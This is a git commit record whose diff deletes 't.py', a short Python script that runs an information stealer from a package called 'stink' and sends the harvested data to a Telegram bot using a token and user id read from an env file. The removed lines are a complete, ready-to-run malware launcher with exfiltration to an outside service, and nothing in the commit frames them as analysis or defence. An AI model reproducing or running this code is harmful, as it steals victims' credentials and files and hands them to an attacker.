164718fae9cbd3bb2ba753de4cde174f1108d322
user-sspmynxdvb <132933165+user-sspmynxdvb@users.noreply.github.com>
2024-04-24 09:16:21 +0300

    delete t.py

--- t.py
+++
@@ -1,6 +0,0 @@
-from stink import Stealer
-from stink.modules import TelegramSender
-from env import *
-
-if __name__ == "__main__":
-    Stealer(sender=TelegramSender(token=token, user_id=id)).run()
